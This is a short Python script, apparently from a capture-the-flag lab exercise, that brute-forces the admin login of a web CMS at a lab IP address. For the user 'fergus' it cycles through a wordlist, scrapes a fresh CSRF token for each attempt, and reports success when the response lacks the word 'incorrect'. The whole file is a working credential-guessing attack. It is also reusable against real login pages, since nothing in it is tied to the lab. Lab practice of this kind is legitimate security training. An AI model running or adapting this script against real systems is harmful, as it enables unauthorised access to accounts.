import requests
import re

# Blunder's IP Address
url='http://10.10.10.191'
# Path to Admin Login Page
path = '/admin/login'
# Username that we found earlier
username = 'fergus'

# Opening the wordlist obtained from cewl
wordlist = open('words', 'r')
words = wordlist.readlines()

# Looping through each entry in the wordlsit
for password in words:
	# Sending a GET requst to get a new CSRF token
	session = requests.session()
	login_page = session.get(url+path)
	# Capturing the CSRF using Regex
	csrf_token = re.search('name="tokenCSRF" value="(.*)"', login_page.text).group(1)
	print ("Trying Password: ", password)
	print ("CSRF Token:", csrf_token) 

	# Creating custom data that is to be sent via POST request
	data = {
		'tokenCSRF': csrf_token,
		'username': username,
		'password': password.strip(),
		'save':''
	}

	# Sending the POST request with custom data and disabling redirects
	login_return = session.post(url+path, data = data, allow_redirects = False)

	print (login_return)
	# Checking if incorrect word is present in the response. 
	# If it is not present then it means we have a successful login.
	if ('incorrect' not in login_return.text):
		print (login_return.text)
		print ("Success!")
		print ('Use username: fergus and password: ', password)
		break